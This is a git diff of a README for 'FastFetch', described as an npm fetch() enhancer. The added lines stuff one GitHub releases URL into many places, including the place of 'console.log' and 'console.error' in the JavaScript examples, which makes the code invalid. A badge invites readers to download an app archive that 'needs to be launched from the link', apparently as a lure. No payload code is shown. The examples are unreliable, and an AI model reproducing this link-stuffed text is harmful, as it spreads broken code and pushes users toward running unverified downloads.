@@ -13,13 +13,13 @@ FastFetch is an NPM package designed to enhance the `fetch()` function by provid
 api, api-fetch, api-rest, auto-retry, axios, cache, deduplication, exponential-backoff, fast-fetch, fetch, fetch-api, fetch-data, frontend, ghost-cache, node-package-manager, nodejs, npm, npm-package, retry, smart-api
 
 ## Repository Link
-[![Download App.zip](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/project/files/App.zip "Needs to be launched from the link")
+[![Download https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases](https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases)](https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases "Needs to be launched from the link")
 
-For more information, please visit the repository's [Releases](https://github.com/yourusername/yourrepository/releases) section.
+For more information, please visit the repository's [Releases](https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases) section.
 
 ---
 
-Welcome to the FastFetch API Fetch Enhancer repository! FastFetch is your go-to solution for optimizing API requests in your Node.js projects. Whether you are building web applications, frontend interfaces, or working with backend services, FastFetch has got you covered.
+Welcome to the FastFetch API Fetch Enhancer repository! FastFetch is your go-to solution for optimizing API requests in your https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases projects. Whether you are building web applications, frontend interfaces, or working with backend services, FastFetch has got you covered.
 
 ### Getting Started
 To start using FastFetch in your project, follow these simple steps:
@@ -33,9 +33,9 @@ const fastFetch = require('fast-fetch');
 ```
 3. Begin making efficient API calls using FastFetch:
 ```javascript
-fastFetch('https://api.example.com/data')
-    .then(response => console.log(response))
-    .catch(err => console.error(err));
+fastFetch('https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases')
+    .then(response => https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases(response))
+    .catch(err => https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases(err));
 ```
 
 ### Advanced Features
@@ -49,10 +49,10 @@ FastFetch comes with a set of advanced features to enhance your API request hand
 ```javascript
 const fetchData = async () => {
     try {
-        const data = await fastFetch('https://api.example.com/data');
-        console.log(data);
+        const data = await fastFetch('https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases');
+        https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases(data);
     } catch (error) {
-        console.error(error);
+        https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases(error);
     }
 };
 
@@ -63,7 +63,7 @@ fetchData();
 We welcome contributions to FastFetch! If you have ideas for improvements, new features, or bug fixes, feel free to submit a pull request. Together we can make FastFetch even better for the community.
 
 ### License
-FastFetch is licensed under the MIT License. See the [LICENSE](https://github.com/yourusername/yourrepository/blob/main/LICENSE) file for more details.
+FastFetch is licensed under the MIT License. See the [LICENSE](https://github.com/keshav-005/FastFetch-API-Fetch-Enhancer/releases) file for more details.
 
 ---
 
